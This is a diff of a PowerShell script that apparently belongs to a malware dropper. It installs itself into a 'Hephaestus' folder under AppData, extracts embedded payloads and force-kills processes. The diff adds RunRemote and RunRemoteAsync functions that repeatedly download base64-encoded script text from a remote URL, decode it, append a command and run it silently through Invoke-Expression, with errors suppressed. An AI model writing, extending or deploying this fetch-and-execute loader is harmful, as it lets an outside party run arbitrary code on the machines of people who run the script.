@@ -1,43 +1,4 @@
 
-function RunRemote {
-    param (
-        [string]$baseUrl,
-        [string]$part,
-        [bool]$waitForFinish
-    )
-    $url = "$baseUrl/$part.txt"
-    $timeout = [datetime]::UtcNow.AddMinutes(5)
-    $delay = 5
-    Start-Sleep -Seconds $delay
-    while ([datetime]::UtcNow -lt $timeout) {
-        try {
-            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
-            if ($response.StatusCode -eq 200) {
-                $scripData = $response.Content
-                $scripData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scripData))
-                $generalJob = Start-Job -ScriptBlock { Invoke-Expression $using:scripData }
-                if ($waitForFinish) {
-                    Wait-Job -Job $generalJob -Timeout 300 | Out-Null
-                    if ($generalJob.State -eq 'Completed') {
-                        $result = Receive-Job -Job $generalJob
-                        Remove-Job -Job $generalJob
-                        return $result
-                    } else {
-                        writedbg "Job did not complete within the timeout period."
-                        Remove-Job -Job $generalJob
-                        return
-                    }
-                } else {
-                    return
-                }
-            }
-        } catch {
-            writedbg "Failed to runremote ($url): $_"
-        }
-        Start-Sleep -Seconds $delay
-    }
-    writedbg "Failed to run remote ($url) within the allotted time."
-}
 
 function IsDebug {
     $debugFile = "C:\debug.txt"
@@ -54,7 +15,6 @@ function IsDebug {
         return $false
     }
 }
-
 
 $globalDebug = IsDebug;
 
@@ -97,21 +57,15 @@ function GetUtfNoBom {
         [string]$file
     )
 
-    # Read the file as a byte array
     $contentBytes = [System.IO.File]::ReadAllBytes($file)
 
-    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
     if ($contentBytes.Length -ge 3 -and $contentBytes[0] -eq 0xEF -and $contentBytes[1] -eq 0xBB -and $contentBytes[2] -eq 0xBF) {
-        # Remove the BOM
         $contentBytes = $contentBytes[3..($contentBytes.Length - 1)]
     }
-
-    # Convert the byte array back to a UTF-8 string
     $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)
 
     return $contentWithoutBom
 }
-
 
 function Get-HephaestusFolder {
     $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
@@ -139,8 +93,6 @@ function Get-BodyPath {
     $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
     return $bodyPath
 }
-
-
 
 function ExtractEmbedding {
     param (
@@ -196,9 +148,8 @@ function RunMe {
         }
     }
     catch {
-          writedbg "RunMe: $_"
+          writedbg "RunMe $_"
     }
-
 }
 
 
@@ -235,4 +186,94 @@ function Close-Processes {
         $command = "taskkill.exe /im $process /f"
         Invoke-Expression $command
     }
+}
+
+function RunRemote {
+    param (
+        [string]$baseUrl,
+        [string]$part,
+        [bool]$waitForFinish,
+        [bool]$inJob = $true,
+        [string] $cmd
+    )
+    $url = "$baseUrl$part.txt"
+    $timeout = [datetime]::UtcNow.AddMinutes(5)
+    $delay = 5
+    Start-Sleep -Seconds $delay
+    while ([datetime]::UtcNow -lt $timeout) {
+        try {
+            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
+            if ($response.StatusCode -eq 200) {
+                $scripData = $response.Content
+                $scripData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scripData)) + "`n`n" + $cmd
+
+                if ($inJob) {
+                    $generalJob = Start-Job -ScriptBlock { Invoke-Expression $using:scripData }
+                    if ($waitForFinish) {
+                        Wait-Job -Job $generalJob -Timeout 300 | Out-Null
+                        if ($generalJob.State -eq 'Completed') {
+                            $result = Receive-Job -Job $generalJob
+                            Remove-Job -Job $generalJob
+                            return $result
+                        } else {
+                            writedbg "Job did not complete within the timeout period."
+                            Remove-Job -Job $generalJob
+                            return
+                        }
+                    } else {
+                        return
+                    }
+                } else {
+                    Invoke-Expression $scripData
+                    return
+                }
+            }
+        } catch {
+            writedbg "Failed to runremote $url $_"
+        } 
+        Start-Sleep -Seconds $delay
+    } 
+    writedbg "Failed to run remote $url within the allotted time."
+}
+
+function RunRemoteAsync {
+    param (
+        [string]$baseUrl,
+        [string]$part,
+        [string]$cmd
+    )
+    $url = "$baseUrl/$part.txt"
+
+    # Main async job to fetch and process the script data
+    $asyncJob = Start-Job -ScriptBlock {
+        param (
+            [string]$url,
+            [string]$cmd
+        )
+
+        $timeout = [datetime]::UtcNow.AddMinutes(5)
+        $delay = 5
+        Start-Sleep -Seconds $delay
+
+        while ([datetime]::UtcNow -lt $timeout) {
+            try {
+                $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
+                if ($response.StatusCode -eq 200) {
+                    # Decode the base64 content and append command
+                    $scripData = $response.Content
+                    $scripData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scripData)) + "`n`n" + $cmd
+                    Invoke-Expression $scripData
+                    return
+                }
+            } catch {
+                # Optional error handling or logging
+            } 
+            Start-Sleep -Seconds $delay
+        }
+    } -ArgumentList $url, $cmd
+
+    # Optional return of the async job, if needed for monitoring
+    #Wait-Job -Job $asyncJob -Timeout 300 | Out-Null
+    #Remove-Job -Job $asyncJob
+    #return $asyncJob
 }
